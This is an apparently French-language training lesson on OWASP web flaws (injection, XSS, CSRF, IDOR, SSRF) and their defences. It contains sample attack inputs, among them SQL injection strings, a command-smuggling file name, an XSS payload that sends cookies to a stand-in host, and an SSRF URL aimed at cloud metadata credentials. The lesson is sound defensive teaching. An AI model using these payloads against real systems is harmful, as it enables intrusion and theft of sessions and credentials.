---
id: securite.n2.les-failles-web
title: Injections, XSS, CSRF, IDOR et SSRF
skills: [injections, xss, csrf, controle-acces, ssrf]
duration_min: 22
---

# Injections, XSS, CSRF, IDOR et SSRF

Le **Top 10 de l'OWASP** recense les catégories de failles les plus fréquentes des
applications web. Ce niveau couvre les plus classiques, avec des démonstrations réelles en
Python. Elles se font **uniquement** sur ses propres applications ou avec une autorisation
écrite.

## Les injections

Une injection survient quand une **donnée** fournie par l'utilisateur est interprétée comme
du **code** (SQL, commande système, LDAP, requête NoSQL…).

```python
def chercher_vulnerable(nom):
    return db.execute(f"select id, nom from utilisateurs where nom = '{nom}'").fetchall()
```

Résultats réels sur une base SQLite de trois utilisateurs :

| Entrée | Résultat |
|---|---|
| `ada` | `[(1, 'ada')]` |
| `x' or '1'='1` | `[(1, 'ada'), (2, 'linus'), (3, 'grace')]` : tous les utilisateurs |
| `x' union select nom, mot_de_passe_hache from utilisateurs --` | les noms **et les empreintes de mots de passe** de tous |

La correction : les **requêtes paramétrées**, où la donnée ne peut jamais devenir du code :

```python
db.execute("select id, nom from utilisateurs where nom = ?", (nom,))
# avec l'entrée x' or '1'='1 → [] : on cherche littéralement un utilisateur nommé ainsi
```

Les ORM paramètrent automatiquement, sauf quand on leur passe du SQL brut construit par
concaténation. Pour ce qui ne peut pas être paramétré (un nom de colonne pour un tri), on
utilise une **liste blanche** de valeurs permises.

**L'injection de commande**, même principe avec le shell. Réel, avec un nom de fichier
`rapport.txt; echo PIRATÉ` :

```python
subprocess.run(f"echo traitement de {fichier}", shell=True)
# traitement de rapport.txt
# PIRATÉ                         ← une seconde commande a été exécutée

subprocess.run(["echo", "traitement de", fichier])
# traitement de rapport.txt; echo PIRATÉ   ← un simple argument
```

On passe les arguments sous forme de **liste**, sans shell, ou mieux, on utilise une
bibliothèque plutôt qu'une commande externe.

## Le cross-site scripting (XSS)

Une **XSS** injecte du JavaScript dans une page vue par **d'autres** utilisateurs. Un
commentaire réel :

```
brut     : <p><script>fetch("https://pirate.exemple/?c=" + document.cookie)</script></p>
échappé  : <p>&lt;script&gt;fetch(&quot;https://pirate.exemple/?c=&quot; + document.cookie)&lt;/script&gt;</p>
```

Affiché brut, le script s'exécute dans le navigateur de chaque visiteur, avec sa session :
vol de données, actions à sa place. Échappé, il s'affiche comme du texte.

Les défenses, en couches :

- **échapper selon le contexte** à l'affichage (HTML, attribut, URL, JavaScript) ; les moteurs
  de gabarits modernes (React, Vue, Thymeleaf, Jinja) le font par défaut, les échappatoires
  (`dangerouslySetInnerHTML`, `v-html`, `|safe`) sont à surveiller en revue de code ;
- **assainir** le HTML qu'on accepte volontairement (éditeur de texte riche) avec une
  bibliothèque dédiée (DOMPurify), jamais avec des expressions régulières maison ;
- une **Content Security Policy** (`Content-Security-Policy: script-src 'self'`) qui interdit
  les scripts en ligne et d'autres origines ;
- des cookies `HttpOnly`, que JavaScript ne peut pas lire.

## Le CSRF

Un **CSRF** (*cross-site request forgery*) fait exécuter une action par le navigateur d'un
utilisateur connecté, depuis un **autre site** : la page piégée contient un formulaire qui se
soumet tout seul vers `https://banque.exemple.com/virement`, et le navigateur ajoute
automatiquement le cookie de session.

Défenses :

- cookies `SameSite=Lax` ou `Strict` (désormais le défaut de la plupart des navigateurs) :
  pas de cookie sur une requête venue d'un autre site ;
- un **jeton anti-CSRF** dans chaque formulaire, que l'autre site ne peut pas connaître ;
- jamais d'action qui modifie quelque chose avec `GET`.

Une API appelée avec un jeton dans l'en-tête `Authorization` (et non un cookie) n'est pas
exposée au CSRF : le navigateur n'ajoute pas cet en-tête tout seul.

## Le contrôle d'accès défaillant (IDOR)

La catégorie **n° 1** du Top 10 de l'OWASP. L'application vérifie que l'utilisateur est
**connecté**, mais pas qu'il a le **droit** d'accéder à **cette** ressource :

```
GET /api/factures/1001   → ma facture
GET /api/factures/1002   → la facture d'un autre client   ← IDOR
```

Aucun outil d'analyse ne le trouve à coup sûr, car c'est une règle métier. La défense :
vérifier **à chaque requête**, côté serveur, que la ressource appartient à l'utilisateur ou
qu'il a le rôle nécessaire, idéalement à un endroit central :

```kotlin
val facture = factures.trouver(id) ?: throw NonTrouve()
if (facture.clientId != utilisateur.id && !utilisateur.estAdmin) throw NonTrouve()   // 404, pas 403
```

Répondre `404` plutôt que `403` évite de confirmer l'existence de la ressource. Des
identifiants non devinables (UUID) réduisent l'exposition, mais **ne remplacent pas** la
vérification. Masquer un bouton dans l'interface n'est pas un contrôle d'accès : l'API
reste appelable directement.

## Le SSRF

Un **SSRF** (*server-side request forgery*) fait envoyer par le **serveur** une requête vers
une adresse choisie par l'attaquant. Exemple : une fonction « importer une image depuis une
URL ». L'attaquant fournit `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
l'adresse du service de métadonnées du cloud, accessible **seulement depuis le serveur**, qui
renvoie des identifiants temporaires. C'est ce qui a permis la fuite de Capital One en 2019
(plus de 100 millions de clients).

Défenses : une liste blanche de domaines autorisés ; refuser les adresses internes, locales et
de métadonnées **après** la résolution DNS (et à chaque redirection) ; isoler le service qui
fait ces requêtes dans un réseau sans accès interne ; et sur AWS, exiger IMDSv2, qui bloque
les requêtes simples vers les métadonnées.

## À retenir

- Injection : une donnée devient du code ; requêtes paramétrées (démontré : `[]` au lieu de toute la table), arguments en liste sans shell.
- XSS : échapper selon le contexte, assainir le HTML accepté, CSP, cookies `HttpOnly`.
- CSRF : `SameSite`, jeton anti-CSRF, pas d'action en `GET`.
- IDOR : vérifier l'appartenance de chaque ressource côté serveur, à chaque requête.
- SSRF : liste blanche, refuser les adresses internes après résolution, isoler, IMDSv2.
